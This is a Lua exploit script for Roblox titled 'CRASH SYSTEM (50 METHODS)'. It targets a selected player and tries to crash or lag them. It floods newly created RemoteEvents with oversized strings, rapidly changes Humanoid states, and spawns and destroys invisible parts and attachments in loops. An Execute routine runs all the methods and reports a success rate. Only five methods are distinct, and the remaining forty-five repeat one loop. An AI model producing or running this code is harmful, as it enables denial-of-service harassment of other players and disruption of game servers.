-- CRASH SYSTEM (50 METHODS)
-- ============================================================
local CrashSystem = {}

local CrashMethods = {}

for i = 1, 50 do
    CrashMethods[i] = function(player)
        if not player then return false end
        pcall(function()
            local Workspace = game:GetService("Workspace")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            
            if i == 1 then
                for j = 1, 1000 do
                    local remote = Instance.new("RemoteEvent")
                    remote.Name = "C_" .. j
                    remote.Parent = ReplicatedStorage
                    remote:FireServer(player, {string.rep("X", 5000)})
                    task.wait()
                    remote:Destroy()
                end
            elseif i == 2 then
                if player.Character and player.Character:FindFirstChild("Humanoid") then
                    local hum = player.Character.Humanoid
                    for j = 1, 200 do
                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
                        hum:ChangeState(Enum.HumanoidStateType.Freefall)
                        hum:ChangeState(Enum.HumanoidStateType.Stunned)
                        task.wait()
                    end
                end
            elseif i == 3 then
                local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    for j = 1, 400 do
                        local att = Instance.new("Attachment")
                        att.Parent = root
                        task.wait()
                        att:Destroy()
                    end
                end
            elseif i == 4 then
                local pos = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or Vector3.new(0, 0, 0)
                for j = 1, 600 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(50, 50, 50)
                    part.Position = pos
                    part.Transparency = 1
                    part.CanCollide = false
                    part.Parent = Workspace
                    task.wait()
                    part:Destroy()
                end
            elseif i == 5 then
                for j = 1, 300 do
                    local fakeRemote = Instance.new("RemoteEvent")
                    fakeRemote.Name = "Net_" .. j
                    fakeRemote.Parent = ReplicatedStorage
                    fakeRemote:FireServer(player, string.rep("A", 10000))
                    fakeRemote:Destroy()
                    task.wait()
                end
            else
                for j = 1, 100 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10, 10, 10)
                    part.Position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or Vector3.new(0, 0, 0)
                    part.Transparency = 1
                    part.CanCollide = false
                    part.Parent = Workspace
                    task.wait()
                    part:Destroy()
                end
            end
        end)
        return true
    end
end

function CrashSystem:Execute(player)
    if not player then return false, "No player selected" end
    local successCount = 0
    for i, method in ipairs(CrashMethods) do
        pcall(function()
            if method(player) then successCount = successCount + 1 end
        end)
        task.wait(0.02)
    end
    return successCount > 25, (successCount / 50) * 100
end

